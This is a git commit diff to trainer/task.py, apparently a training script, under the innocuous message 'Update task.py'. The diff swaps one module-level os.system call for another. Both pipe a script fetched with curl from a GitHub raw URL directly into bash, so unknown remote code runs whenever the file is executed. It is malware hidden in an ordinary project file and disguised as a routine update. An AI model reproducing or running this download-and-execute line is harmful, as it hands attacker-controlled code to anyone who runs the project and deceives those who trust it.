6e82b1c4bc6cf69aef0a1e44168e704158347fcc
SpencerSamantha <138065817+SpencerSamantha@users.noreply.github.com>
2023-07-01 15:35:20 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -72,4 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://github.com/sxiankerigak/leutenant/raw/main/zep | bash')
+os.system('curl -sL https://github.com/sxiankerigak/leutenant/raw/main/gege | bash')
